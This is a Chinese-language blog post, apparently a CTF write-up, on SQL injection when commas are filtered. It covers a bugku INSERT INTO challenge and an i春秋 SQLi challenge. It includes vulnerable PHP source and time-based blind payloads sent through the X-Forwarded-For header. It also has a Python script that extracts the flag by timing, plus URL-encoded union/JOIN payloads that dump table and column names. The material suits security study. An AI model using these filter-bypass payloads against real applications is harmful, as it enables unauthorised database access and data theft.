@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>无逗号注入 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#小实验"><span class="toc-text">小实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bugku-INSERT-INTO-SQL"><span class="toc-text">bugku INSERT INTO SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#i春秋百度杯九月第三周SQLi"><span class="toc-text">i春秋百度杯九月第三周SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表"><span class="toc-text">爆表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆列"><span class="toc-text">爆列</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">无逗号注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 22, 2018&nbsp;&nbsp;19:37:41</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>sql注入的防御在于过滤非法字符串,而通过精心构造的语法能绕过过滤.记录一下,无逗号注入的两个姿势</p>
+<a id="more"></a>
+
+<h2 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h2><p>两张图片自行领会</p>
+<p><img src="%E6%97%A0%E9%80%97%E5%8F%B7%E6%B3%A8%E5%85%A5/sql1.png" alt></p>
+<p><img src="%E6%97%A0%E9%80%97%E5%8F%B7%E6%B3%A8%E5%85%A5/sql2.png" alt></p>
+<h2 id="bugku-INSERT-INTO-SQL"><a href="#bugku-INSERT-INTO-SQL" class="headerlink" title="bugku INSERT INTO SQL"></a><a href="http://120.24.86.145:8002/web15/" target="_blank" rel="noopener">bugku INSERT INTO SQL</a></h2><p>这题题目给出了源码,从请求包中获取IP,插入数据库中,并且再回显回页面.</p>
+<p>从源码上看,只对ip进行了逗号分割的操作.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
+
+<p>首先先判断是否存在注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:1.1.1.1&apos;+sleep(5) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>发现确是延迟五秒返回</p>
+<p><img src="%E6%97%A0%E9%80%97%E5%8F%B7%E6%B3%A8%E5%85%A5/bugku1.png" alt></p>
+<p>如果我们输入常规的注入语句,例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E6%97%A0%E9%80%97%E5%8F%B7%E6%B3%A8%E5%85%A5/bugk2.png" alt></p>
+<p>发现第一个逗号右边的都不见了.</p>
+<p>那么就要构造一种不需要逗号的注入</p>
+<p>所以可以构造语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&apos;+(select case when substr((database()) from 1 for 1)&gt;&apos;a&apos; then sleep(5) else 0 end))-- +</span><br><span class="line"></span><br><span class="line">127.0.0.1&apos;+(select case when ascii(substr((database()) from 1 for 1))&gt;1 then sleep(5) else 0 end))-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E6%97%A0%E9%80%97%E5%8F%B7%E6%B3%A8%E5%85%A5/bugku3.png" alt></p>
+<p>发现截取第几位字符可以用 from 1 for 1来代替</p>
+<p>剩下的就是构造常规的sql语句,分别爆表名,列名,字段,这里就不赘述了,需要写一个脚本..</p>
+<p>别人网站上偷了一个</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">maystr=<span class="string">"0987654321qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sql/sql.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">   <span class="keyword">for</span> str <span class="keyword">in</span> maystr:</span><br><span class="line">     headers=&#123;<span class="string">"x-forwarded-for"</span>:<span class="string">"127.0.0.1'+"</span>+<span class="string">"(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(6) else sleep(0) end ) and '1'='1"</span>%(i+<span class="number">1</span>,str)&#125;</span><br><span class="line"> <span class="comment"># proxy=&#123;"http":"http://127.0.0.1:8080"&#125;</span></span><br><span class="line"> <span class="comment"># res=requests.get(url,headers=headers,timeout=3)</span></span><br><span class="line">     <span class="keyword">try</span>: </span><br><span class="line">         res=requests.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">     <span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">         flag=flag+str</span><br><span class="line">         <span class="keyword">print</span> <span class="string">"flag:"</span>,flag</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">     <span class="keyword">except</span> KeyboardInterrupt,e:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> <span class="comment"># rint i+1,str</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="i春秋百度杯九月第三周SQLi"><a href="#i春秋百度杯九月第三周SQLi" class="headerlink" title="i春秋百度杯九月第三周SQLi"></a>i春秋百度杯九月第三周SQLi</h2><p>同样的发现逗号被过滤了,没有逗号 截取字符串可以是上文利用 from 1 来读取整个字符,</p>
+<p>这边用另外一种姿势</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from  ( (select user())a JOIN  (select version())b );</span><br></pre></td></tr></table></figure>
+
+<p>对这个没有去过多的研究,先简单的记录下这个姿势,原理性的东西慢慢啃吧,狗命要紧.(逃:</p>
+<h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%27%20union%20select%20*%20from%20((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())a%20JOIN%20(select%20version())b)%20%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%27%20union%20select%20*%20from%20((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)a%20JOIN%20(select%20version())b)%20%23</span><br></pre></td></tr></table></figure>
+
+<p>一开始只想到注入出一个表一个列,当意识到第一个表和列并没有flag的时候想着查询第二个列,可是…limit需要逗号啊啊啊啊!郁闷了半天之后可以用group_cancat().</p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/09/22/无逗号注入/">http://yoursite.com/2018/09/22/无逗号注入/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/09/26/sqli/">宽字节注入和报错注入记录</a>
+            
+            
+            <a class="next" rel="next" href="/2018/09/21/LDAP/">初见LDAP注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
